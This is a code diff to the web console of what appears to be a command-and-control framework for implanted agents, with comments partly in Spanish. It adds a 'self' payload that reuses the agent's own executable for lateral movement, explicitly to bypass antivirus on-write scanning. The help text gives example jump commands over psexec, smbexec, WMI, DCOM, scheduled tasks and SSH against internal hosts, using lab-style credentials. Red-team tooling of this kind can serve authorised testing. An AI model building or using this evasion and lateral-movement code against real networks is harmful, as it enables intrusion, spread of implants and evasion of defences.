@@ -3881,7 +3881,10 @@ async function runCtxAction(act) {
         const uploadFiles = (uploadR?.ok  ? uploadR.data||[]  : []).filter(f => f.filename?.match(/\.(exe|bin)$/i) && !f.agent_id);
         const artifactNames = new Set(artifacts.map(f => f.filename));
         const fmtDate = s => { try { return new Date(s).toLocaleDateString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); } catch(_){return '';} };
-        const payloadItems  = [{v:'', l:'🆕 Build new (auto)'}]
+        const payloadItems  = [
+            {v:'', l:'🆕 Build new (auto)'},
+            {v:'self', l:'♻️ Reusar binario actual (self) — sin escritura a disco'},
+          ]
           .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}  (${fmtDate(f.created_at)})`})))
           .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename)).map(f=>({v:f.filename,l:f.filename})));
 
@@ -9913,25 +9916,31 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           '  dcom    — SMB + MMC20.Application DCOM ExecuteShellCommand\n' +
           '  runas   — schtasks local como usuario distinto (privesc mismo host)\n' +
           '  ssh     — SCP upload + SSH exec (Windows → Linux/Unix)\n\n' +
+          'Payload especial:\n' +
+          '  self    — reutiliza el propio exe del agente (ya en disco, sin escritura nueva → bypass AV on-write)\n\n' +
           'Ejemplos:\n' +
           '  jump psexec   10.7.10.22 agent.exe\n' +
           '  jump smbexec  10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
           '  jump atexec   10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
           '  jump wmi      10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
           '  jump dcom     10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
-          '  jump ssh      192.168.1.50 implant.elf root r00tpass',
+          '  jump ssh      192.168.1.50 implant.elf root r00tpass\n' +
+          '  jump runas    10.10.10.22 self .\\\\localuser password   (reusa binario actual)',
           '', null);
         return;
       }
       // Use cached type from previous successful dispatch, default JUMP
       taskType = localStorage.getItem('jumpType_' + agentID) || 'JUMP';
-      taskArgs = JSON.stringify({
+      // "self" payload: agent reuses its own exe on disk — no new file write, bypasses on-write AV scan
+      const jumpPayload = lp[2] || '';
+      const jumpObj = {
         method:  lMethod,
         host:    lp[1],
-        payload: lp[2],
+        payload: jumpPayload,
         user:    lp[3] || '',
         pass:    lp.slice(4).join(' ') || '',
-      });
+      };
+      taskArgs = JSON.stringify(jumpObj);
       // Register watcher so spawned agent auto-gets parent_id (lateral move or local privesc)
       _lateralWatchers[lp[1]] = {
         parentID: agentID,
